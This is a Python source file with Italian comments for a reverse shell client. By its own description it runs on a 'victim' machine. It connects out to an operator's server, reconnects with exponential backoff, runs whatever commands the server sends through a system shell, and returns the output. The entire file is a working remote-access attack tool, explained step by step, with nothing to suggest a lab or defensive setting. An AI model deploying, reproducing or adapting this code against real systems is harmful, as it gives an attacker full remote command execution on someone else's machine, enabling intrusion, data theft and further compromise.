#!/usr/bin/env python3
"""
Reverse Shell Client
Questo programma gira sulla macchina "vittima".
Si connette a un server remoto e:
- riceve comandi
- li esegue localmente
- rimanda l'output al server
"""

import os          # gestione filesystem (cd, directory)
import sys         # uscita dal programma
import time        # sleep e retry
import socket      # comunicazione TCP
import struct      # serializzazione lunghezze messaggi
import subprocess  # esecuzione comandi di sistema


def reliable_send(sock, data):
    """
    Invia dati al server in modo strutturato.

    Problema:
    TCP è uno stream → il server non sa dove finisce un messaggio.

    Soluzione:
    [4 byte lunghezza][dati]
    """

    # Se è stringa → converte in bytes
    if isinstance(data, str):
        data = data.encode()

    # Invia lunghezza del messaggio (4 byte, big-endian)
    sock.sendall(struct.pack('>I', len(data)))

    # Invia il contenuto reale
    sock.sendall(data)


def reliable_recv(sock):
    """
    Riceve dati dal server usando protocollo length-prefix.
    """

    # legge primi 4 byte (lunghezza messaggio)
    raw_len = sock.recv(4)

    # se vuoto → connessione chiusa
    if not raw_len:
        return None

    # converte bytes → int
    data_len = struct.unpack('>I', raw_len)[0]

    # legge esattamente N byte
    return sock.recv(data_len)


def execute_command(command):
    """
    Esegue il comando ricevuto dal server.

    QUI succede il "vero controllo remoto".
    """

    try:
        if command.startswith('cd '):
            """
            cd NON può essere fatto con subprocess:
            perché cambierebbe solo il processo figlio.

            Serve cambiare directory del processo attuale.
            """

            # cambia directory del processo Python
            os.chdir(command[3:])

            # cd non produce output
            return b""

        proc = subprocess.run(
            command,
            shell=True,              # esegue tramite shell del sistema
            stdout=subprocess.PIPE,  # cattura output standard
            stderr=subprocess.PIPE   # cattura errori
        )

        # unisce output + errori
        return proc.stdout + proc.stderr

    except Exception as e:
        # se qualcosa va male → ritorna errore
        return str(e).encode()


def connect_to_server(server_ip, server_port):
    """
    Tenta di connettersi al server in loop infinito.

    Se fallisce:
    - aspetta
    - aumenta tempo di attesa
    - riprova (exponential backoff)
    """

    reconnect_delay = 5
    max_delay = 60

    while True:
        try:
            print(f"\n[*] Connecting to {server_ip}:{server_port}...")

            # crea socket TCP IPv4
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            # tenta connessione al server
            sock.connect((server_ip, server_port))

            print("[+] Connection established!")

            return sock  # esce dal loop e ritorna socket attivo

        except (socket.error, ConnectionRefusedError) as e:
            print(f"[!] Connection failed: {e}")
            print(f"[*] Retrying in {reconnect_delay}s...")

            time.sleep(reconnect_delay)

            # backoff esponenziale (5 → 10 → 20 → 40 → 60)
            reconnect_delay = min(reconnect_delay * 2, max_delay)

        except KeyboardInterrupt:
            print("\n[!] Stopped by user.")
            sys.exit(0)


def main():
    """
    Flusso principale del client:

    1. connessione al server
    2. loop infinito:
        - riceve comando
        - lo esegue
        - invia output
    """

    print("=== Reverse Shell Client ===")

    # configurazione server
    server_ip = input("Enter server IP: ").strip()
    server_port = int(input("Enter server port: ").strip())

    while True:
        try:
            # connessione al server
            sock = connect_to_server(server_ip, server_port)

            while True:

                # riceve comando dal server
                command = reliable_recv(sock)

                # se connessione chiusa o exit → esce
                if not command or command.decode().lower() == 'exit':
                    break

                # esegue comando localmente
                output = execute_command(command.decode())

                # manda risultato al server
                reliable_send(sock, output)

            # chiusura socket
            sock.close()

            print("[!] Disconnected. Reconnecting...")

        except Exception as e:
            print(f"[!] Error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    main()